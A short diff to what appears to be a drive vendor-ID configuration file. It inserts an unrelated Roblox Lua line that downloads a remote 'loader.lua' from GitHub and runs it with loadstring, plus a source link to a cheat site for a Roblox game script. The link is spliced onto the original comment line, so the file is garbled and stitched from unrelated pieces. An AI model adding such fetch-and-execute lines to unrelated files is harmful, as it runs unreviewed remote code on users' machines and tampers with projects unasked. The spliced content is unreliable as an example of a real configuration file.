@@ -1,4 +1,6 @@
-# You can add your drive's vendor id and vendor name here.
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Laspard69/HorizonHub/refs/heads/main/loader.lua", true))()
+
+Source: https://cheater.fun/hacks_roblox/11413-99-nights-in-the-forest-script.html# You can add your drive's vendor id and vendor name here.
 #
 # Only edit this file if the script warns you about a missing vendor id.
 
